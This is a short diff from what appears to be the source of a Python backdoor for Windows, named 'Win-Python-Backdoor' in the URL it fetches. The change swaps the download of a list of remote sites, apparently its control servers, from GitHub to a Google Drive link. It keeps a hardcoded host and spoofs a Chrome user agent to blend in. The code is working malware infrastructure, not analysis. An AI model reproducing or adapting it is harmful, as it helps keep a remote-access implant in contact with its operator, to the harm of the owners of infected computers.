@@ -135,7 +135,8 @@ requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
 ua = UserAgent()
 #print(ua.chrome)
 header = {'User-Agent':str(ua.chrome)}
-mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+#mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+mainsite = requests.get("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF", headers=header)
 #print mainsite.text
 sites = ["paner.altervista.org"]#, mainsite.text]
 sites.extend(mainsite.text.split(",") )
